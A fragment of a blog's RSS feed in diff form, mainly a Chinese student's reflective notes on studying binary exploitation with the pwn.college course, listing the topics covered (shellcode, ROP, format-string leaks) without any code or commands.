+		&lt;img src=&#34;https://id-none.github.io/2024/vehicle-to-vehicle-energy-sharing-scheme-a-privacy-preserving-solution-based-on-local-differential-privacy-method/image-20240517143953811.png&#34;
+			width=&#34;814&#34;
+			height=&#34;333&#34;
+			srcset=&#34;https://id-none.github.io/2024/vehicle-to-vehicle-energy-sharing-scheme-a-privacy-preserving-solution-based-on-local-differential-privacy-method/image-20240517143953811_hucaba1749cc297673ffc2a14ee56f4968_50568_480x0_resize_box_3.png 480w, https://id-none.github.io/2024/vehicle-to-vehicle-energy-sharing-scheme-a-privacy-preserving-solution-based-on-local-differential-privacy-method/image-20240517143953811_hucaba1749cc297673ffc2a14ee56f4968_50568_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;公式&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;公式&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>PwnCollege 学习笔记</title>
+        <link>https://id-none.github.io/2024/pwncollege-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</link>
+        <pubDate>Fri, 17 May 2024 13:26:06 +0800</pubDate>
+        
+        <guid>https://id-none.github.io/2024/pwncollege-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</guid>
+        <description>&lt;img src="https://id-none.github.io/2024/pwncollege-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240517133556992.png" alt="Featured image of post PwnCollege 学习笔记" /&gt;&lt;h1 id=&#34;1-学习路线&#34;&gt;1. 学习路线&lt;/h1&gt;
+&lt;p&gt;作为一名网络安全的学生，最开始接触到的就是web安全。但是在学习web安全的过程中，逐渐发现web安全需要更多更广的知识面。但是这对于现在的我来说是不现实的，因为在读研过程中，花费更时间去阅读论文和完成导师的项目。&lt;/p&gt;
+&lt;p&gt;此外，总是听见别人说，pwn爷，pwn爷的，也觉得学习pwn，二进制安全是很厉害的。不过也正式因为如此，pwn的学习需要很多基本知识（汇编，C/C++，linux安全机制，堆栈相关知识等）。总之就是需要很多知识作为铺垫才能帮助去深入理解pwn的原理和技术。&lt;/p&gt;
+&lt;h1 id=&#34;2-pwncollege&#34;&gt;2. PwnCollege&lt;/h1&gt;
+&lt;p&gt;众所周知，学习安全技术，特别是这种国内敏感技术，很多国内的网站是无法找到资源的。机缘巧合之前，我认识了一个大佬同学（腾讯安全、UCI博士在读），在他的建议下，我开始尝试pwnCollege的学习。作为一个英语高考只有100分的我来说，在学习过程中确实遇到了很多很多的困难。&lt;/p&gt;
+&lt;p&gt;但是兴趣是最好的老师，这个课程的学习相比课堂上的读PPT会更加有趣且令人心动。在这种兴趣的不断吸引下，我从23年8月份开始学习pwnCollege的CES-466课程，截至目前位置已经完成一半内容 的学习。当然距离蓝带的路还是很远很远。&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 218; 
+			flex-basis: 524px&#34;
+	&gt;
+	&lt;a href=&#34;https://id-none.github.io/2024/pwncollege-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240517135251761.png&#34; data-size=&#34;686x314&#34;&gt;
+		&lt;img src=&#34;https://id-none.github.io/2024/pwncollege-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240517135251761.png&#34;
+			width=&#34;686&#34;
+			height=&#34;314&#34;
+			srcset=&#34;https://id-none.github.io/2024/pwncollege-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240517135251761_huae0e5876dec935c3ff8c899b3530d576_25126_480x0_resize_box_3.png 480w, https://id-none.github.io/2024/pwncollege-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240517135251761_huae0e5876dec935c3ff8c899b3530d576_25126_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			&gt;
+	&lt;/a&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 138; 
+			flex-basis: 333px&#34;
+	&gt;
+	&lt;a href=&#34;https://id-none.github.io/2024/pwncollege-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240517135330228.png&#34; data-size=&#34;1426x1026&#34;&gt;
+		&lt;img src=&#34;https://id-none.github.io/2024/pwncollege-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240517135330228.png&#34;
+			width=&#34;1426&#34;
+			height=&#34;1026&#34;
+			srcset=&#34;https://id-none.github.io/2024/pwncollege-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240517135330228_huf345f04237d23d65b248d76c14b50303_142720_480x0_resize_box_3.png 480w, https://id-none.github.io/2024/pwncollege-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240517135330228_huf345f04237d23d65b248d76c14b50303_142720_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			&gt;
+	&lt;/a&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;从最简单的程序交互-&amp;gt;汇编基础-&amp;gt;shellcode注入-&amp;gt;debug-&amp;gt;逆向工程。。。&lt;/p&gt;
+&lt;p&gt;在这些学习过程中，我收获很多，开始逐渐向着计算机底层靠近。&lt;/p&gt;
+&lt;h1 id=&#34;3-感受&#34;&gt;3. 感受&lt;/h1&gt;
+&lt;p&gt;通过冯诺依曼结构的代码段和text段没有明显区别可以在堆栈上写入shellcode，去执行恶意代码；&lt;/p&gt;
+&lt;p&gt;设置ROP完成系统调用；格式化字符串泄露程序carry，爆破PIE，libc地址泄露，任意内存读写去修改汇编指令完成程序执行流（CFI）的控制，这些都是我在学习中获得的知识。每一次过题，都是一种前所未有的幸福，不仅仅是自己的知识增长了，更重要的是，解开了所谓”抽象“的面纱。&lt;/p&gt;
+</description>
+        </item>
+        
+    </channel>
+</rss>
